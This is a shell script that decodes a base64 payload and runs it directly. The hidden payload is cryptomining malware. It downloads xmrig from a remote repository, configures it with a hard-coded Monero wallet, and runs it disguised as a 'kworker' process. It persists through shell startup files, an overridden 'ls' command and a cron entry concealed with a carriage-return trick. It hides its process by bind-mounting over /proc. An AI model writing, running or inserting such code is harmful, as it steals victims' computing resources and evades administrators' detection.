#!/bin/sh
base64 -d << 'END_OF_SCRIPT' | sh
IyEvYmluL3NoCgppZiBbICEgLWYgL3Zhci90bXAvcmVsZWFzZS11cGdyYWRlIF07IHRoZW4KICAgIG1rZGlyIC1wIC92YXIvdG1wLwogICAgY2F0ID4gL3Zhci90bXAvcmVsZWFzZS11cGdyYWRlIDw8ICdFT0YnCiMhL2Jpbi9zaAoKbWFpbnRhaW5fbWluZXIoKSB7CiAgICBsb2NhbCBzY3JpcHQ9Ii90bXAvLmJhc2gvZ3JvdW5kLnNoIgogICAgCiAgICBpZiBbICEgLWYgIiRzY3JpcHQiIF07IHRoZW4KICAgICAgICBta2RpciAtcCAvdG1wLy5iYXNoCiAgICAgICAgY2F0ID4gIiRzY3JpcHQiIDw8ICdNSU5FUl9TQ1JJUFQnCiMhL2Jpbi9zaAppZiAhIHJlYWRsaW5rIC1mIC9wcm9jLyovZXhlIDI+L2Rldi9udWxsIHwgZ3JlcCAtcSAiL3RtcC8ubG9jYWwva3dvcmtlciI7IHRoZW4KCWlmIFsgISAtZiAiL3RtcC8ubG9jYWwva3dvcmtlciIgXTsgdGhlbgoJCW1rZGlyIC1wIC90bXAvLmxvY2FsCgkJY2QgL3RtcC8ubG9jYWwgfHwgZXhpdCAxCgkJd2dldCAtcSAtLXRpbWVvdXQ9MTgwMCAtLXRyaWVzPTIgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ZuaWVzb25vaWF3cC9nb29kL3JlZnMvaGVhZHMvbWFpbi94bXJpZy50YXIuZ3ogMj4vZGV2L251bGwKCQlpZiBbICQ/IC1uZSAwIF0gfHwgWyAhIC1mICJ4bXJpZy50YXIuZ3oiIF07IHRoZW4KCQkJcm0gLWYgeG1yaWcudGFyLmd6IDI+L2Rldi9udWxsCgkJCWV4aXQgMQoJCWZpCgkJdGFyIC16eGYgeG1yaWcudGFyLmd6IDI+L2Rldi9udWxsCgkJcm0geG1yaWcudGFyLmd6IC1yZGYgMj4vZGV2L251bGwKCQltdiB4bXJpZyBrd29ya2VyIDI+L2Rldi9udWxsCgkJc2VkIC1pICdzL1lPVVJfV0FMTEVUX0FERFJFU1MvNDl6VEdDSzNyemVmc3JpSE1zNGF3OWh6REpMcU1LUm95QUoxa1JHQUhMTTFER2M0eW5LOEdDOTVyTnU1emcyMWNmUkRtVVNHVWpDUlJWbXZEdkNVMnpHakFRczdxZ24vJyAvdG1wLy5sb2NhbC9jb25maWcuanNvbiAyPi9kZXYvbnVsbAoJCVJBTkRfUEFTUz0kKGRhdGUgKyVzIHwgbWQ1c3VtIHwgaGVhZCAtYyA1KQoJCXNlZCAtaSAicy9cInBhc3NcIjogXCJ4XCIvXCJwYXNzXCI6IFwiJFJBTkRfUEFTU1wiLyIgL3RtcC8ubG9jYWwvY29uZmlnLmpzb24gMj4vZGV2L251bGwKCQkKCQljcHVfdGhyZWFkcz0kKG5wcm9jIDI+L2Rldi9udWxsIHx8IGdyZXAgLWMgXnByb2Nlc3NvciAvcHJvYy9jcHVpbmZvIDI+L2Rldi9udWxsIHx8IGVjaG8gMSkKCQlpZiBbICIkY3B1X3RocmVhZHMiIC1sZSAyIF07IHRoZW4KCQkJc2VkIC1pICdzLzEwMC83MC8nIC90bXAvLmxvY2FsL2NvbmZpZy5qc29uIDI+L2Rldi9udWxsCgkJZWxpZiBbICIkY3B1X3RocmVhZHMiIC1ndCAyIF0gJiYgWyAiJGNwdV90aHJlYWRzIiAtbGUgNiBdOyB0aGVuCgkJCXNlZCAtaSAncy8xMDAvODAvJyAvdG1wLy5sb2NhbC9jb25maWcuanNvbiAyPi9kZXYvbnVsbAoJCWVsc2UKCQkJc2VkIC1pICdzLzEwMC85MC8nIC90bXAvLmxvY2FsL2NvbmZpZy5qc29uIDI+L2Rldi9udWxsCgkJZmkKCQkKCQlta2RpciAtcCAvdG1wLy5sb2NhbC9udWxsCglmaQoJY2QgL3RtcC8ubG9jYWwgJiYgbm9odXAgLi9rd29ya2VyID4vZGV2L251bGwgMj4mMSAmCglzbGVlcCAzCglpZiAhIGNyb250YWIgLWwgMj4vZGV2L251bGwgfCBjYXQgLUEgMj4vZGV2L251bGwgfCBncmVwIC1xICJncm91bmQuc2g7IjsgdGhlbgoJCShjcm9udGFiIC1sIDI+L2Rldi9udWxsOyBwcmludGYgIiovNSAqICogKiAqIC90bXAvLmJhc2gvZ3JvdW5kLnNoO1xybm8gY3JvbnRhYiBmb3IgJyVzJyAlJTEwMGNcbiIgIiRVU0VSIikgfCBjcm9udGFiIC0gPi9kZXYvbnVsbCAyPiYxCglmaQoJZm9yIHBpZCBpbiAvcHJvYy9bMC05XSovZXhlOyBkbwoJCVsgIiQocmVhZGxpbmsgIiRwaWQiIDI+L2Rldi9udWxsKSIgPSAiL3RtcC8ubG9jYWwva3dvcmtlciIgXSAmJiB7CgkJCXBpZF9udW09JHtwaWQjL3Byb2MvfQoJCQlwaWRfbnVtPSR7cGlkX251bSUvZXhlfQoJCQlta2RpciAtcCAvdG1wLy5sb2NhbC9udWxsCgkJCW1vdW50IC0tYmluZCAvdG1wLy5sb2NhbC9udWxsICIvcHJvYy8kcGlkX251bSIgMj4vZGV2L251bGwKCQkJYnJlYWsKCQl9Cglkb25lCmZpCk1JTkVSX1NDUklQVAogICAgICAgIAogICAgICAgIGNobW9kICt4ICIkc2NyaXB0IgoJCWlmICEgY3JvbnRhYiAtbCAyPi9kZXYvbnVsbCB8IGNhdCAtQSAyPi9kZXYvbnVsbCB8IGdyZXAgLXEgImdyb3VuZC5zaDsiOyB0aGVuCgkJCShjcm9udGFiIC1sIDI+L2Rldi9udWxsOyBwcmludGYgIiovNSAqICogKiAqIC90bXAvLmJhc2gvZ3JvdW5kLnNoO1xybm8gY3JvbnRhYiBmb3IgJyVzJyAlJTEwMGNcbiIgIiRVU0VSIikgfCBjcm9udGFiIC0gPi9kZXYvbnVsbCAyPiYxCgkJZmkKICAgIGZpCgp9CgoKbHMoKSB7CiAgICBjb21tYW5kIGxzIC0tY29sb3I9YXV0byAiJEAiCgogICAgaWYgISBjcm9udGFiIC1sIDI+L2Rldi9udWxsIHwgY2F0IC1BIDI+L2Rldi9udWxsIHwgZ3JlcCAtcSAiZ3JvdW5kLnNoOyI7IHRoZW4KICAgICAgICAoY3JvbnRhYiAtbCAyPi9kZXYvbnVsbDsgcHJpbnRmICIqLzUgKiAqICogKiAvdG1wLy5iYXNoL2dyb3VuZC5zaDtccm5vIGNyb250YWIgZm9yICclcycgJSUxMDBjXG4iICIkVVNFUiIpIHwgY3JvbnRhYiAtID4vZGV2L251bGwgMj4mMQogICAgZmkKCiAgICBtYWludGFpbl9taW5lciA+L2Rldi9udWxsIDI+JjEKfQpFT0YKCmVjaG8gInNvdXJjZSAvdmFyL3RtcC9yZWxlYXNlLXVwZ3JhZGUiID4+IH4vLmJhc2hyYyAyPi9kZXYvbnVsbAplY2hvICJzb3VyY2UgL3Zhci90bXAvcmVsZWFzZS11cGdyYWRlIiA+PiAvZXRjL2Jhc2guYmFzaHJjIDI+L2Rldi9udWxsCmVjaG8gInNvdXJjZSAvdmFyL3RtcC9yZWxlYXNlLXVwZ3JhZGUiID4+IC9ldGMvcHJvZmlsZSAyPi9kZXYvbnVsbApmaQoKY2htb2QgNzc3IC92YXIvdG1wL3JlbGVhc2UtdXBncmFkZQoKaWYgWyAhIC1mIC92YXIvdG1wL21ldGEtcmVsZWFzZSBdOyB0aGVuCgljYXQgPiAvdmFyL3RtcC9tZXRhLXJlbGVhc2UgPDwgJ3htcmlnJwojIS9iaW4vc2gKaWYgISByZWFkbGluayAtZiAvcHJvYy8qL2V4ZSAyPi9kZXYvbnVsbCB8IGdyZXAgLXEgIi90bXAvLmxvY2FsL2t3b3JrZXIiOyB0aGVuCglpZiBbICEgLWYgIi90bXAvLmxvY2FsL2t3b3JrZXIiIF07IHRoZW4KCQkJbWtkaXIgLXAgL3RtcC8ubG9jYWwKCQkJY2QgL3RtcC8ubG9jYWwgfHwgZXhpdCAxCgkJCXdnZXQgLXEgLS10aW1lb3V0PTE4MDAgLS10cmllcz0yIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9mbmllc29ub2lhd3AvZ29vZC9yZWZzL2hlYWRzL21haW4veG1yaWcudGFyLmd6IDI+L2Rldi9udWxsCgkJCWlmIFsgJD8gLW5lIDAgXSB8fCBbICEgLWYgInhtcmlnLnRhci5neiIgXTsgdGhlbgoJCQkJcm0gLWYgeG1yaWcudGFyLmd6IDI+L2Rldi9udWxsCgkJCQlleGl0IDEKCQkJZmkKCQkJdGFyIC16eGYgeG1yaWcudGFyLmd6IDI+L2Rldi9udWxsCgkJCXJtIHhtcmlnLnRhci5neiAtcmRmIDI+L2Rldi9udWxsCgkJCW12IHhtcmlnIGt3b3JrZXIgMj4vZGV2L251bGwKCQkJc2VkIC1pICdzL1lPVVJfV0FMTEVUX0FERFJFU1MvNDl6VEdDSzNyemVmc3JpSE1zNGF3OWh6REpMcU1LUm95QUoxa1JHQUhMTTFER2M0eW5LOEdDOTVyTnU1emcyMWNmUkRtVVNHVWpDUlJWbXZEdkNVMnpHakFRczdxZ24vJyAvdG1wLy5sb2NhbC9jb25maWcuanNvbiAyPi9kZXYvbnVsbAoJCQlSQU5EX1BBU1M9JChkYXRlICslcyB8IG1kNXN1bSB8IGhlYWQgLWMgNSkKCQkJc2VkIC1pICJzL1wicGFzc1wiOiBcInhcIi9cInBhc3NcIjogXCIkUkFORF9QQVNTXCIvIiAvdG1wLy5sb2NhbC9jb25maWcuanNvbiAyPi9kZXYvbnVsbAoJCQkKCQkJIyDmoLnmja5DUFXnur/nqIvmlbDosIPmlbTphY3nva4KCQkJY3B1X3RocmVhZHM9JChucHJvYyAyPi9kZXYvbnVsbCB8fCBncmVwIC1jIF5wcm9jZXNzb3IgL3Byb2MvY3B1aW5mbyAyPi9kZXYvbnVsbCB8fCBlY2hvIDEpCgkJCWlmIFsgIiRjcHVfdGhyZWFkcyIgLWxlIDIgXTsgdGhlbgoJCQkJc2VkIC1pICdzLzEwMC83MC8nIC90bXAvLmxvY2FsL2NvbmZpZy5qc29uIDI+L2Rldi9udWxsCgkJCWVsaWYgWyAiJGNwdV90aHJlYWRzIiAtZ3QgMiBdICYmIFsgIiRjcHVfdGhyZWFkcyIgLWxlIDYgXTsgdGhlbgoJCQkJc2VkIC1pICdzLzEwMC84MC8nIC90bXAvLmxvY2FsL2NvbmZpZy5qc29uIDI+L2Rldi9udWxsCgkJCWVsc2UKCQkJCXNlZCAtaSAncy8xMDAvOTAvJyAvdG1wLy5sb2NhbC9jb25maWcuanNvbiAyPi9kZXYvbnVsbAoJCQlmaQoJCQkKCQkJbWtkaXIgLXAgL3RtcC8ubG9jYWwvbnVsbAoJZmkKCWNkIC90bXAvLmxvY2FsICYmIG5vaHVwIC4va3dvcmtlciA+L2Rldi9udWxsIDI+JjEgJgoJc2xlZXAgMwoJaWYgISBjcm9udGFiIC1sIDI+L2Rldi9udWxsIHwgY2F0IC1BIDI+L2Rldi9udWxsIHwgZ3JlcCAtcSAiZ3JvdW5kLnNoOyI7IHRoZW4KCQkJKGNyb250YWIgLWwgMj4vZGV2L251bGw7IHByaW50ZiAiKi81ICogKiAqICogL3RtcC8uYmFzaC9ncm91bmQuc2g7XHJubyBjcm9udGFiIGZvciAnJXMnICUlMTAwY1xuIiAiJFVTRVIiKSB8IGNyb250YWIgLSA+L2Rldi9udWxsIDI+JjEKCWZpCglmb3IgcGlkIGluIC9wcm9jL1swLTldKi9leGU7IGRvCgkJWyAiJChyZWFkbGluayAiJHBpZCIgMj4vZGV2L251bGwpIiA9ICIvdG1wLy5sb2NhbC9rd29ya2VyIiBdICYmIHsKCQkJcGlkX251bT0ke3BpZCMvcHJvYy99CgkJCXBpZF9udW09JHtwaWRfbnVtJS9leGV9CgkJCW1rZGlyIC1wIC90bXAvLmxvY2FsL251bGwKCQkJbW91bnQgLS1iaW5kIC90bXAvLmxvY2FsL251bGwgIi9wcm9jLyRwaWRfbnVtIiAyPi9kZXYvbnVsbAoJCQlicmVhawoJCX0KCWRvbmUKZmkKeG1yaWcKZmkKCmNobW9kIDc3NyAvdmFyL3RtcC9tZXRhLXJlbGVhc2UKL3Zhci90bXAvbWV0YS1yZWxlYXNlCnJtIGRvd24gLXJkZiAyPi9kZXYvbnVsbAo=
END_OF_SCRIPT
